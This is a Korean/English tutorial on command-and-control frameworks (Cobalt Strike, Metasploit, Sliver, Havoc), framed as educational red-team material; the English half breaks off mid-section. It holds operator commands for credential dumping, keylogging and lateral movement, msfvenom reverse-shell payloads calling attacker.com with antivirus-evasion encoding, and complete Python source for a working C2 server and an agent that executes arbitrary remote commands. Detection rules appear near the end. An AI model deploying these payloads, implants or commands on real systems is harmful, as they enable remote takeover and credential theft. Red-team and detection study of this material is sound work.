> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# C2 프레임워크 (Command & Control Frameworks)

> **목적**: 교육, 연구, CTF, 공인된 레드팀 작전 환경에서의 학습용 자료

---

## 1. C2 아키텍처 개요

### 1.1 기본 구조 다이어그램

```
[공격자 머신(Operator)]
        |
        | (암호화 통신)
        v
[팀서버 / C2 서버]
   ├── Listener (포트 443, 80, 53 등)
   ├── 페이로드 생성기
   └── 세션 관리자
        |
        | (C2 채널: HTTP/HTTPS/DNS/SMB)
        v
[피해자 머신 (Implant/Beacon/Agent)]
   ├── 비콘 → 주기적 C2 서버 콜백
   ├── 명령 수신 및 실행
   └── 결과 반환
```

### 1.2 C2 통신 흐름

```
1. 초기 감염 (Initial Access)
   └─> 페이로드 실행 (매크로, 드라이브바이, 피싱 등)

2. 에이전트 초기화 (Agent Initialization)
   └─> 에이전트가 C2 서버로 등록 요청
   └─> 식별자(UUID), 시스템 정보 전송

3. 비커닝 루프 (Beaconing Loop)
   └─> 에이전트가 주기적으로 C2 폴링
   └─> 명령 있으면 수신 → 실행 → 결과 반환

4. 측면 이동 / 권한 상승
   └─> 새 에이전트 배포, 피벗 포인트 확보

5. 목표 달성 후 정리
   └─> 에이전트 자삭, 로그 삭제
```

### 1.3 C2 채널 비교표

| 채널 | 장점 | 단점 | 탐지 난이도 |
|------|------|------|------------|
| HTTP | 방화벽 통과 용이, 구현 쉬움 | 평문 트래픽 | 낮음 |
| HTTPS | 암호화, 신뢰도 높음 | 인증서 필요 | 중간 |
| DNS | 방화벽 대부분 허용 | 느림, 용량 제한 | 높음 |
| SMB | 내부망 피벗에 적합 | 외부 통신 불가 | 중간 |
| ICMP | 비정상적이지만 가능 | 많은 환경에서 차단 | 높음 |
| WebSocket | 지속 연결, 빠름 | DPI 탐지 가능 | 중간 |

---

## 2. Cobalt Strike

### 2.1 개념 및 구조

Cobalt Strike는 상용 레드팀 프레임워크로, 고급 APT(지능형 지속 위협) 시뮬레이션에 사용된다.

**핵심 구성 요소:**

```
[팀서버 (Team Server)]
  - 모든 Operator의 허브
  - 리스너 관리
  - Beacon 세션 관리
  - 로그 및 아티팩트 저장

[클라이언트 (Cobalt Strike GUI)]
  - Operator가 사용하는 인터페이스
  - 팀서버에 원격 접속
  - 다중 Operator 협업 가능

[Beacon]
  - 임플란트(Implant)/에이전트
  - HTTP, HTTPS, DNS, SMB 통신
  - 메모리 내 실행 (디스크 미기록)
  - Sleep + Jitter로 탐지 회피

[Listener]
  - Beacon 콜백을 받는 서버 측 수신기
  - HTTP Listener: 포트 80/8080
  - HTTPS Listener: 포트 443
  - DNS Listener: 포트 53 (UDP)
  - SMB Named Pipe: 내부망 피벗

[Malleable C2 Profile]
  - Beacon 트래픽 외형을 정의
  - 정상 트래픽으로 위장 (Amazon, Office365 등)
  - URI 패턴, User-Agent, 헤더 커스터마이징
```

### 2.2 팀서버 기본 설정 개념

```bash
# 팀서버 실행 (개념)
# ./teamserver <IP> <패스워드> [프로파일]
./teamserver 0.0.0.0 StrongPassword123 /opt/profiles/amazon.profile

# 클라이언트 접속
# ./cobaltstrike
# → 팀서버 IP, 포트(50050), 패스워드 입력
```

### 2.3 Beacon 명령어 기본

```
# 기본 시스템 정보
beacon> sysinfo
beacon> getuid
beacon> getpid

# 프로세스 관리
beacon> ps
beacon> inject <PID> <아키텍처> <리스너>
beacon> migrate <PID>

# 파일 작업
beacon> ls
beacon> cd C:\Users\target\Desktop
beacon> upload /local/file
beacon> download C:\target\file.txt

# 권한 상승
beacon> getsystem
beacon> elevate uac-token-duplication <리스너>

# 자격증명 수집
beacon> hashdump
beacon> logonpasswords
beacon> dcsync <도메인> <계정>

# 측면 이동
beacon> jump psexec <타겟> <리스너>
beacon> jump winrm <타겟> <리스너>
beacon> spawn <리스너>
```

### 2.4 Malleable C2 프로파일 개념

```
# amazon.profile 예시 구조
set sleeptime "5000";   # 5초 대기
set jitter    "10";     # ±10% 지터

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";
        metadata {
            base64;
            prepend "session-token=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/plain";
        output {
            print;
        }
    }
}
```

---

## 3. Metasploit msfconsole C2

### 3.1 Metasploit 아키텍처

```
msfconsole
  ├── 모듈 (Modules)
  │   ├── Exploits     → 취약점 익스플로잇
  │   ├── Payloads     → 에이전트 코드
  │   ├── Auxiliaries  → 스캐너, 퍼저 등
  │   ├── Post         → 사후 익스플로잇
  │   └── Encoders     → 페이로드 인코딩
  ├── msfvenom         → 독립 페이로드 생성
  └── meterpreter      → 고급 에이전트
```

### 3.2 핸들러 설정 및 세션 관리

```bash
# msfconsole 실행
msfconsole -q

# 멀티 핸들러 설정
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false    # 여러 세션 처리
set EnableStageEncoding true
exploit -j                 # 백그라운드 실행

# 세션 관리
sessions -l                # 세션 목록
sessions -i 1              # 세션 1 상호작용
sessions -k 1              # 세션 1 종료
sessions -u 1              # 세션 업그레이드

# 백그라운드 작업
background                 # 현재 세션 백그라운드
jobs -l                    # 실행 중인 핸들러
```

### 3.3 페이로드 생성 (msfvenom)

```bash
# Windows x64 HTTPS 리버스 쉘 EXE
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 \
  LPORT=443 \
  -f exe \
  -o payload.exe

# Linux ELF 바이너리
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.10.10 \
  LPORT=4444 \
  -f elf \
  -o shell

# PowerShell 스크립트
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com \
  LPORT=443 \
  -f psh \
  -o payload.ps1

# DLL 페이로드
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com \
  LPORT=443 \
  -f dll \
  -o inject.dll

# 인코딩으로 AV 우회 시도 (제한적 효과)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com \
  LPORT=443 \
  -e x64/xor_dynamic \
  -i 5 \
  -f exe \
  -o encoded.exe
```

### 3.4 Meterpreter 사후 익스플로잇

```bash
# 시스템 정보
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getpid
meterpreter> ps

# 권한 상승
meterpreter> getsystem
meterpreter> use post/multi/recon/local_exploit_suggester
meterpreter> run post/windows/escalate/bypassuac

# 자격증명 수집
meterpreter> hashdump
meterpreter> run post/windows/gather/credentials/credential_collector
meterpreter> load kiwi
meterpreter> creds_all

# 피벗 설정
meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.2.10
meterpreter> run post/multi/manage/autoroute

# 스크린샷 / 키로깅
meterpreter> screenshot
meterpreter> keyscan_start
meterpreter> keyscan_dump

# 파일 작업
meterpreter> upload /attacker/nc.exe C:\\Windows\\Temp\\nc.exe
meterpreter> download C:\\Users\\admin\\Documents\\secret.docx
```

---

## 4. Sliver C2

### 4.1 개요 및 특징

Sliver는 BishopFox가 개발한 오픈소스 C2 프레임워크로 Go 언어로 작성되었다.

```
특징:
- 완전 오픈소스 (Apache 2.0)
- mTLS, WireGuard, HTTP/S, DNS 지원
- 자동 인증서 생성
- 크로스 플랫폼 임플란트 (Windows/Linux/macOS)
- 멀티플레이어 지원
```

### 4.2 설치 및 초기 설정

```bash
# Sliver 서버 설치
curl https://sliver.sh/install | sudo bash

# 또는 소스에서 빌드
git clone https://github.com/BishopFox/sliver
cd sliver
make

# 서버 실행
sudo sliver-server

# 운영자 프로파일 생성
sliver > new-operator --name operator1 --lhost 10.0.0.1
# → operator1_10.0.0.1.cfg 파일 생성

# 클라이언트 연결
sliver-client import operator1_10.0.0.1.cfg
sliver-client
```

### 4.3 기본 사용법

```bash
# 리스너 시작
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443
sliver > dns --domains c2.example.com

# 임플란트 생성
sliver > generate --mtls 10.0.0.1:8888 \
  --os windows \
  --arch amd64 \
  --format exe \
  --save /tmp/implant.exe

# 비콘(Beacon) 생성 (주기적 콜백)
sliver > generate beacon \
  --mtls 10.0.0.1:8888 \
  --seconds 30 \
  --jitter 5 \
  --os linux \
  --save /tmp/beacon

# 세션 관리
sliver > sessions          # 활성 세션 목록
sliver > use <세션ID>      # 세션 선택
sliver [세션] > info        # 시스템 정보
sliver [세션] > ls          # 파일 목록
sliver [세션] > execute whoami
sliver [세션] > upload /local/file /remote/path
sliver [세션] > download /remote/file
sliver [세션] > shell       # 인터랙티브 쉘

# 피벗
sliver [세션] > pivots tcp --lport 9999
sliver > generate --tcp-pivot 10.0.0.2:9999 --save pivot.exe
```

---

## 5. Havoc Framework

### 5.1 개요

Havoc은 모던 C2 프레임워크로 Cobalt Strike의 오픈소스 대안이다.

```
구성 요소:
- Teamserver: Go 기반 C2 서버
- Havoc Client: Qt 기반 GUI
- Demon: C/ASM 기반 임플란트
- Phantom: 추가 임플란트 옵션

특징:
- Sleep Obfuscation 지원
- AMSI/ETW 우회 내장
- Process Injection 다양한 기법
- Kerberos 공격 지원
```

### 5.2 기본 설정

```yaml
# config.yaotl (팀서버 설정)
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
    Build {
        Compiler64 = "x86_64-w64-mingw32-gcc"
        Compiler86 = "i686-w64-mingw32-gcc"
    }
}

Operators {
    user "operator1" {
        Password = "SecurePass!"
    }
}

Listeners {
    Http {
        Name = "MainHTTPS"
        Hosts = ["attacker.com"]
        HostBind = "0.0.0.0"
        PortBind = 443
        Secure = true
    }
}
```

---

## 6. HTTP/HTTPS/DNS/SMB C2 채널 상세

### 6.1 HTTP C2

```
요청 패턴:
  GET /updates/check?id=<인코딩된 에이전트ID> HTTP/1.1
  Host: legitimate-looking.com
  User-Agent: Mozilla/5.0 ...

응답 패턴:
  HTTP/1.1 200 OK
  Content-Type: application/json
  {"status": "ok", "data": "<base64 인코딩 명령>"}

탐지 지표:
  - 비정상적으로 규칙적인 폴링 패턴
  - 비표준 User-Agent
  - 암호화되지 않은 비콘 트래픽
  - 비정상적인 Content-Type
```

### 6.2 DNS C2

```
작동 원리:
  에이전트 → DNS 쿼리(TXT/A 레코드) → C2 서버
  
  # 명령 전달 (서버 → 에이전트)
  <인코딩>.<도메인>.c2.attacker.com  TXT "Y21kOiB3aG9hbWk="

  # 결과 반환 (에이전트 → 서버)  
  <결과 청크>.<세션ID>.<도메인>.c2.attacker.com

DNS C2 도구:
  - dnscat2 (오픈소스)
  - iodine (DNS 터널링)
  - Cobalt Strike DNS Beacon

탐지 지표:
  - 비정상적으로 긴 DNS 쿼리
  - 높은 DNS 쿼리 빈도
  - TXT 레코드 쿼리 다수
  - NXDOMAIN 응답 패턴
```

### 6.3 SMB Named Pipe C2

```
사용 사례:
  - 내부망 피벗 포인트
  - 인터넷 비연결 시스템 제어
  - 네트워크 분할 우회

아키텍처:
  [외부 에이전트] ←HTTPS→ [C2 서버]
       ↕ SMB Named Pipe
  [내부 피벗 에이전트] ←Named Pipe→ [내부 타겟들]

Named Pipe 경로 예시:
  \\.\pipe\MSSE-1234-server  (Cobalt Strike 기본)
  \\.\pipe\msagent_1234
  \\.\pipe\postex_1234
```

---

## 7. Python 교육용 HTTP C2 서버/에이전트 구현

### 7.1 C2 서버

```python
#!/usr/bin/env python3
"""
교육용 간단한 HTTP C2 서버 구현
목적: C2 통신 원리 이해 (CTF/교육 환경 전용)
"""

from __future__ import annotations

import argparse
import base64
import json
import logging
import os
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
from urllib.parse import parse_qs, urlparse


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)


@dataclass
class Agent:
    agent_id: str
    hostname: str
    username: str
    os_info: str
    ip_address: str
    registered_at: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    pending_commands: list[dict[str, Any]] = field(default_factory=list)
    results: list[dict[str, Any]] = field(default_factory=list)


class C2Server:
    def __init__(self) -> None:
        self.agents: dict[str, Agent] = {}
        self.lock = threading.Lock()

    def register_agent(self, agent_id: str, info: dict[str, Any]) -> None:
        with self.lock:
            if agent_id not in self.agents:
                agent = Agent(
                    agent_id=agent_id,
                    hostname=info.get("hostname", "unknown"),
                    username=info.get("username", "unknown"),
                    os_info=info.get("os", "unknown"),
                    ip_address=info.get("ip", "unknown"),
                )
                self.agents[agent_id] = agent
                logger.info(f"새 에이전트 등록: {agent_id} ({agent.hostname}/{agent.username})")
            else:
                self.agents[agent_id].last_seen = datetime.now()

    def add_command(self, agent_id: str, command: str) -> bool:
        with self.lock:
            if agent_id not in self.agents:
                return False
            cmd_id = str(uuid.uuid4())[:8]
            self.agents[agent_id].pending_commands.append({
                "id": cmd_id,
                "command": command,
                "issued_at": datetime.now().isoformat(),
            })
            logger.info(f"명령 추가 [{agent_id}]: {command}")
            return True

    def get_pending_commands(self, agent_id: str) -> list[dict[str, Any]]:
        with self.lock:
            if agent_id not in self.agents:
                return []
            agent = self.agents[agent_id]
            agent.last_seen = datetime.now()
            cmds = agent.pending_commands.copy()
            agent.pending_commands.clear()
            return cmds

    def store_result(self, agent_id: str, cmd_id: str, result: str) -> None:
        with self.lock:
            if agent_id in self.agents:
                self.agents[agent_id].results.append({
                    "cmd_id": cmd_id,
                    "result": result,
                    "received_at": datetime.now().isoformat(),
                })
                logger.info(f"결과 수신 [{agent_id}][{cmd_id}]: {result[:100]}...")

    def list_agents(self) -> list[dict[str, Any]]:
        with self.lock:
            return [
                {
                    "id": a.agent_id,
                    "hostname": a.hostname,
                    "username": a.username,
                    "os": a.os_info,
                    "ip": a.ip_address,
                    "last_seen": a.last_seen.isoformat(),
                    "pending": len(a.pending_commands),
                }
                for a in self.agents.values()
            ]


c2 = C2Server()


class C2RequestHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt: str, *args: Any) -> None:
        # 기본 로그 억제 (자체 로거 사용)
        pass

    def _send_json(self, status: int, data: dict[str, Any]) -> None:
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Server", "Apache/2.4.41")  # 위장
        self.end_headers()
        self.wfile.write(body)

    def _read_json_body(self) -> dict[str, Any] | None:
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            return None
        raw = self.rfile.read(length)
        try:
            return json.loads(raw.decode())
        except (json.JSONDecodeError, UnicodeDecodeError):
            return None

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        # 에이전트 등록/폴링 엔드포인트
        if parsed.path == "/api/updates":
            agent_id = params.get("id", [""])[0]
            info_b64 = params.get("info", [""])[0]

            if not agent_id:
                self._send_json(400, {"error": "invalid"})
                return

            try:
                info = json.loads(base64.b64decode(info_b64).decode())
            except Exception:
                info = {}

            c2.register_agent(agent_id, info)
            commands = c2.get_pending_commands(agent_id)

            encoded_cmds = base64.b64encode(
                json.dumps(commands).encode()
            ).decode()
            self._send_json(200, {"status": "ok", "data": encoded_cmds})

        # 에이전트 목록 (운영자용)
        elif parsed.path == "/admin/agents":
            agents = c2.list_agents()
            self._send_json(200, {"agents": agents})

        else:
            self._send_json(404, {"error": "not found"})

    def do_POST(self) -> None:
        parsed = urlparse(self.path)

        # 명령 결과 수신
        if parsed.path == "/api/results":
            body = self._read_json_body()
            if not body:
                self._send_json(400, {"error": "invalid"})
                return

            agent_id = body.get("id", "")
            cmd_id = body.get("cmd_id", "")
            result_b64 = body.get("result", "")

            try:
                result = base64.b64decode(result_b64).decode()
            except Exception:
                result = result_b64

            c2.store_result(agent_id, cmd_id, result)
            self._send_json(200, {"status": "ok"})

        # 명령 전달 (운영자용)
        elif parsed.path == "/admin/command":
            body = self._read_json_body()
            if not body:
                self._send_json(400, {"error": "invalid"})
                return

            agent_id = body.get("agent_id", "")
            command = body.get("command", "")

            if c2.add_command(agent_id, command):
                self._send_json(200, {"status": "queued"})
            else:
                self._send_json(404, {"error": "agent not found"})

        else:
            self._send_json(404, {"error": "not found"})


def run_interactive_shell() -> None:
    """운영자 인터랙티브 쉘"""
    print("\n[*] C2 운영자 쉘 시작 (help로 도움말)")
    while True:
        try:
            cmd = input("\nC2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] 종료")
            break

        if not cmd:
            continue
        elif cmd == "help":
            print("  agents          - 에이전트 목록")
            print("  use <ID>        - 에이전트 선택")
            print("  results <ID>    - 결과 확인")
            print("  quit            - 종료")
        elif cmd == "agents":
            agents = c2.list_agents()
            if not agents:
                print("[-] 등록된 에이전트 없음")
            else:
                print(f"\n{'ID':<12} {'호스트명':<20} {'유저':<15} {'마지막 응답'}")
                print("-" * 65)
                for a in agents:
                    print(f"{a['id']:<12} {a['hostname']:<20} {a['username']:<15} {a['last_seen']}")
        elif cmd.startswith("use "):
            parts = cmd.split(None, 1)
            if len(parts) < 2:
                print("[-] 사용법: use <에이전트ID>")
                continue
            agent_id = parts[1]
            # 에이전트 세션으로 진입
            while True:
                try:
                    sub_cmd = input(f"\nC2 [{agent_id[:8]}]> ").strip()
                except (EOFError, KeyboardInterrupt):
                    break
                if sub_cmd in ("back", "exit", "quit"):
                    break
                if sub_cmd:
                    c2.add_command(agent_id, sub_cmd)
                    print(f"[+] 명령 대기열 추가됨")
        elif cmd.startswith("results "):
            parts = cmd.split(None, 1)
            if len(parts) < 2:
                continue
            agent_id = parts[1]
            with c2.lock:
                if agent_id in c2.agents:
                    results = c2.agents[agent_id].results
                    if not results:
                        print("[-] 결과 없음")
                    else:
                        for r in results[-5:]:  # 최근 5개
                            print(f"\n[CMD {r['cmd_id']}] {r['received_at']}")
                            print(r['result'])
                else:
                    print("[-] 에이전트를 찾을 수 없음")
        elif cmd == "quit":
            break
        else:
            print(f"[-] 알 수 없는 명령: {cmd}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="교육용 HTTP C2 서버 (CTF/연구 전용)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--host", default="0.0.0.0",
        help="바인딩 호스트 (기본: 0.0.0.0)",
    )
    parser.add_argument(
        "--port", type=int, default=8080,
        help="바인딩 포트 (기본: 8080)",
    )
    parser.add_argument(
        "--no-shell", action="store_true",
        help="인터랙티브 쉘 비활성화",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    server = HTTPServer((args.host, args.port), C2RequestHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    logger.info(f"C2 서버 시작: http://{args.host}:{args.port}")
    logger.info("에이전트 엔드포인트: GET /api/updates?id=<ID>&info=<base64>")
    logger.info("결과 엔드포인트:     POST /api/results")
    logger.info("관리 엔드포인트:     GET /admin/agents, POST /admin/command")

    if not args.no_shell:
        run_interactive_shell()
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    logger.info("[*] 서버 종료")
    server.shutdown()


if __name__ == "__main__":
    main()
```

### 7.2 C2 에이전트 (교육용)

```python
#!/usr/bin/env python3
"""
교육용 HTTP C2 에이전트
CTF/교육 환경 전용 - 실제 악용 금지
"""

from __future__ import annotations

import argparse
import base64
import json
import logging
import os
import platform
import subprocess
import sys
import time
import uuid
from typing import Any

import urllib.request
import urllib.error

logger = logging.getLogger(__name__)


def get_system_info() -> dict[str, Any]:
    return {
        "hostname": platform.node(),
        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "os": f"{platform.system()} {platform.release()}",
        "ip": "127.0.0.1",  # 교육용 단순화
    }


def execute_command(command: str) -> str:
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[오류] 명령 타임아웃"
    except Exception as e:
        return f"[오류] {e}"


def beacon(c2_url: str, agent_id: str, info_b64: str) -> list[dict[str, Any]]:
    url = f"{c2_url}/api/updates?id={agent_id}&info={info_b64}"
    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            if data.get("status") == "ok":
                cmds_raw = base64.b64decode(data["data"]).decode()
                return json.loads(cmds_raw)
    except (urllib.error.URLError, json.JSONDecodeError, Exception) as e:
        logger.debug(f"비커닝 실패: {e}")
    return []


def send_result(c2_url: str, agent_id: str, cmd_id: str, result: str) -> None:
    url = f"{c2_url}/api/results"
    payload = json.dumps({
        "id": agent_id,
        "cmd_id": cmd_id,
        "result": base64.b64encode(result.encode()).decode(),
    }).encode()
    try:
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        logger.debug(f"결과 전송 실패: {e}")


def run_agent(c2_url: str, sleep: int, jitter: float) -> None:
    agent_id = str(uuid.uuid4())[:12]
    info = get_system_info()
    info_b64 = base64.b64encode(json.dumps(info).encode()).decode()

    logger.info(f"에이전트 시작: {agent_id}")

    import random

    while True:
        commands = beacon(c2_url, agent_id, info_b64)
        for cmd in commands:
            cmd_id = cmd.get("id", "unknown")
            command = cmd.get("command", "")
            logger.info(f"명령 수신: {command}")
            result = execute_command(command)
            send_result(c2_url, agent_id, cmd_id, result)

        jitter_val = random.uniform(-jitter, jitter) * sleep
        actual_sleep = max(1, sleep + jitter_val)
        time.sleep(actual_sleep)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="교육용 C2 에이전트")
    parser.add_argument("--c2", required=True, help="C2 서버 URL (예: http://127.0.0.1:8080)")
    parser.add_argument("--sleep", type=int, default=5, help="폴링 간격(초)")
    parser.add_argument("--jitter", type=float, default=0.2, help="지터 비율 (0~1)")
    parser.add_argument("--debug", action="store_true")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.WARNING,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )
    try:
        run_agent(args.c2, args.sleep, args.jitter)
    except KeyboardInterrupt:
        print("\n[*] 에이전트 종료")


if __name__ == "__main__":
    main()
```

---

## 8. C2 트래픽 탐지 (블루팀 관점)

### 8.1 네트워크 기반 탐지

```
탐지 방법 1: 비커닝 패턴 분석
  - 동일 목적지로 규칙적인 연결 (예: 30초마다)
  - 연결 수립 후 데이터 교환 없음
  - 비정상적으로 일정한 패킷 크기

탐지 방법 2: JA3/JA3S 핑거프린팅
  - TLS 클라이언트 헬로 파라미터로 C2 툴 식별
  - 알려진 Cobalt Strike/Metasploit JA3 해시 블랙리스트

탐지 방법 3: DNS 분석
  - 높은 엔트로피 도메인 (DGA 탐지)
  - 비정상적으로 긴 서브도메인
  - TXT 레코드 대량 조회

탐지 방법 4: 비콘 타이밍 분석
  # 시간차 표준편차가 낮으면 자동화된 비커닝
  import statistics
  intervals = [29.8, 30.1, 29.9, 30.2, 30.0]
  std_dev = statistics.stdev(intervals)
  # std_dev < 1.0 이면 의심
```

### 8.2 호스트 기반 탐지

```
탐지 지표 (IOC):
  프로세스:
  - rundll32.exe → 네트워크 연결
  - powershell.exe -enc <base64>
  - mshta.exe → 외부 URL 접속
  - wscript.exe / cscript.exe → 비정상 경로

  레지스트리:
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  - 비정상적인 서비스 등록

  메모리:
  - 실행 가능 메모리 영역 (RWX)
  - 디스크에 없는 실행 코드
  - 비정상 PE 헤더 (Reflective DLL)

탐지 도구:
  - Sysmon (이벤트 로깅)
  - Volatility (메모리 분석)
  - YARA 규칙 (Beacon 패턴 매칭)
  - EDR 솔루션 (CrowdStrike, SentinelOne)
```

### 8.3 YARA 탐지 규칙 예시

```yara
rule CobaltStrike_Beacon {
    meta:
        description = "Cobalt Strike Beacon 메모리 패턴"
    strings:
        $mz = { 4D 5A }
        $cs1 = "%02d/%02d/%02d %02d:%02d:%02d"
        $cs2 = "ReflectiveLoader"
        $cs3 = { FC E8 89 00 00 00 60 89 E5 31 D2 }
    condition:
        $mz at 0 and ($cs2 or ($cs1 and $cs3))
}

rule Generic_HTTP_Beacon {
    meta:
        description = "일반적인 HTTP 비커닝 패턴"
    strings:
        $ua1 = "Mozilla/5.0" ascii
        $beacon1 = "sleep" ascii nocase
        $beacon2 = "checkin" ascii nocase
        $beacon3 = "callback" ascii nocase
    condition:
        $ua1 and 2 of ($beacon*)
}
```

### 8.4 Sigma 탐지 규칙

```yaml
title: C2 비커닝 DNS 패턴 탐지
status: experimental
description: 의심스러운 DNS C2 통신 패턴 탐지
logsource:
    category: dns
detection:
    selection:
        dns.query.name|re: '^[a-z0-9]{20,}\.'
    timeframe: 1m
    condition: selection | count() > 50
falsepositives:
    - CDN 도메인
    - 합법적인 고엔트로피 도메인
level: medium
tags:
    - attack.command_and_control
    - attack.t1071.004
```

---

## 참고 자료

- MITRE ATT&CK: TA0011 Command and Control
- Cobalt Strike Documentation (공식)
- Sliver GitHub: https://github.com/BishopFox/sliver
- Havoc Framework GitHub
- "The C2 Matrix" 프로젝트 (c2matrix.com)

---

<a name="english"></a>

# C2 Frameworks (Command & Control Frameworks)

> **Purpose**: Educational material for learning in CTF, research, and authorized red team operation environments

---

## 1. C2 Architecture Overview

### 1.1 Basic Structure Diagram

```
[Attacker Machine (Operator)]
        |
        | (encrypted communication)
        v
[Team Server / C2 Server]
   ├── Listener (ports 443, 80, 53, etc.)
   ├── Payload generator
   └── Session manager
        |
        | (C2 channel: HTTP/HTTPS/DNS/SMB)
        v
[Victim Machine (Implant/Beacon/Agent)]
   ├── Beacon → periodic C2 server callback
   ├── Receive and execute commands
   └── Return results
```

### 1.2 C2 Communication Flow

```
1. Initial Access
   └─> Execute payload (macro, drive-by, phishing, etc.)

2. Agent Initialization
   └─> Agent sends registration request to C2 server
   └─> Transmit identifier (UUID), system information

3. Beaconing Loop
   └─> Agent periodically polls C2
   └─> If commands exist: receive → execute → return results

4. Lateral Movement / Privilege Escalation
   └─> Deploy new agents, secure pivot points

5. Cleanup after Objectives
   └─> Agent self-destruct, log deletion
```

### 1.3 C2 Channel Comparison

| Channel | Advantages | Disadvantages | Detection Difficulty |
|---------|-----------|---------------|---------------------|
| HTTP | Easily passes firewalls, easy to implement | Plaintext traffic | Low |
| HTTPS | Encrypted, high trust | Certificate required | Medium |
| DNS | Mostly allowed by firewalls | Slow, capacity limited | High |
| SMB | Suitable for internal network pivoting | No external communication | Medium |
| ICMP | Abnormal but possible | Blocked in many environments | High |
| WebSocket | Persistent connection, fast | DPI detection possible | Medium |

---

## 2. Cobalt Strike

### 2.1 Concept and Architecture

Cobalt Strike is a commercial red team framework used for advanced APT (Advanced Persistent Threat) simulation.

**Core Components:**

```
[Team Server]
  - Hub for all Operators
  - Listener management
  - Beacon session management
  - Log and artifact storage

[Client (Cobalt Strike GUI)]
  - Interface used by Operators
  - Remote connection to team server
  - Multi-Operator collaboration possible

[Beacon]
  - Implant/Agent
  - HTTP, HTTPS, DNS, SMB communications
  - In-memory execution (not recorded to disk)
  - Sleep + Jitter for detection evasion

[Listener]
  - Server-side receiver for Beacon callbacks
  - HTTP Listener: ports 80/8080
  - HTTPS Listener: port 443
  - DNS Listener: port 53 (UDP)
  - SMB Named Pipe: internal network pivoting

[Malleable C2 Profile]
  - Defines the appearance of Beacon traffic
  - Disguises as legitimate traffic (Amazon, Office365, etc.)
  - URI patterns, User-Agent, header customization
```

### 2.2 Basic Team Server Configuration Concept

```bash
# Run team server (concept)
# ./teamserver <IP> <password> [profile]
./teamserver 0.0.0.0 StrongPassword123 /opt/profiles/amazon.profile

# Client connection
# ./cobaltstrike
# → Enter team server IP, port (50050), password
```

### 2.3 Basic Beacon Commands

```
# Basic system information
beacon> sysinfo
beacon> getuid
beacon> getpid

# Process management
beacon> ps
beacon> inject <PID> <architecture> <listener>
beacon> migrate <PID>

# File operations
beacon> ls
beacon> cd C:\Users\target\Desktop
beacon> upload /local/file
beacon> download C:\target\file.txt

# Privilege escalation
beacon> getsystem
beacon> elevate uac-token-duplication <listener>

# Credential collection
beacon> hashdump
beacon> logonpasswords
beacon> dcsync <domain> <account>

# Lateral movement
beacon> jump psexec <target> <listener>
beacon> jump winrm <target> <listener>
beacon> spawn <listener>
```

### 2.4 Malleable C2 Profile Concept

```
# amazon.profile example structure
set sleeptime "5000";   # Wait 5 seconds
set jitter    "10";     # ±10% jitter

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";
        metadata {
            base64;
            prepend "session-token=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/plain";
        output {
            print;
        }
    }
}
```

---

## 3. Metasploit msfconsole C2

### 3.1 Metasploit Architecture

```
msfconsole
  ├── Modules
  │   ├── Exploits     → vulnerability exploitation
  │   ├── Payloads     → agent code
  │   ├── Auxiliaries  → scanners, fuzzers, etc.
  │   ├── Post         → post-exploitation
  │   └── Encoders     → payload encoding
  ├── msfvenom         → standalone payload generation
  └── meterpreter      → advanced agent
```

### 3.2 Handler Setup and Session Management

```bash
# Run msfconsole
msfconsole -q

# Set up multi handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
